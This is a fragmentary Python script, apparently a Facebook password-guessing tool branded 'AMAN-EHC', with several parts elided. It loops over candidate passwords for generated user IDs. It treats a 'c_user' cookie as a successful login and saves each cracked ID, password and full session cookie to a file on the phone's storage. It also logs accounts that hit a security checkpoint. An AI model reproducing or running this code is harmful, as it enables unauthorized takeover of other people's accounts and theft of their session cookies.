...
for txxxtt in range (1000):
	...
	ugen.append(ffg)
#--------------------------(LOGO BOX)--------------------------#
logo = """    __       ___      ___       __      _____  ___   
 \033[38;5;46m    /""\     |"  \    /"  |     /""\    (\"   \|"  \  
\033[38;5;46m    /    \     \   \  //   |    /    \   |.\\   \    | 
\033[38;5;46m   /' /\  \    /\\  \/.    |   /' /\  \  |: \.   \\  | 
\033[38;5;46m  //  __'  \  |: \.        |  //  __'  \ |.  \    \. | 
\033[38;5;46m /   /  \\  \ |.  \    /:  | /   /  \\  \|    \    \ | 
\033[38;5;46m(___/    \___)|___|\__/|___|(___/    \___)\___|\____\)                                                        
"""   
#--------------------------(MENU BOX)--------------------------#
os.system('clear')
class Main:
        ...
        for ps in pwx:
          ...
          'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;92m[AMAN-EHC] {uid}|{ps}")
                open('/sdcard/AMAN-EHC/AMAN-EHC.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;191m[AMAN-EHC] {uid}|{ps}")
                open('/sdcard/AMAN-EHC/AMAN-EHC.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
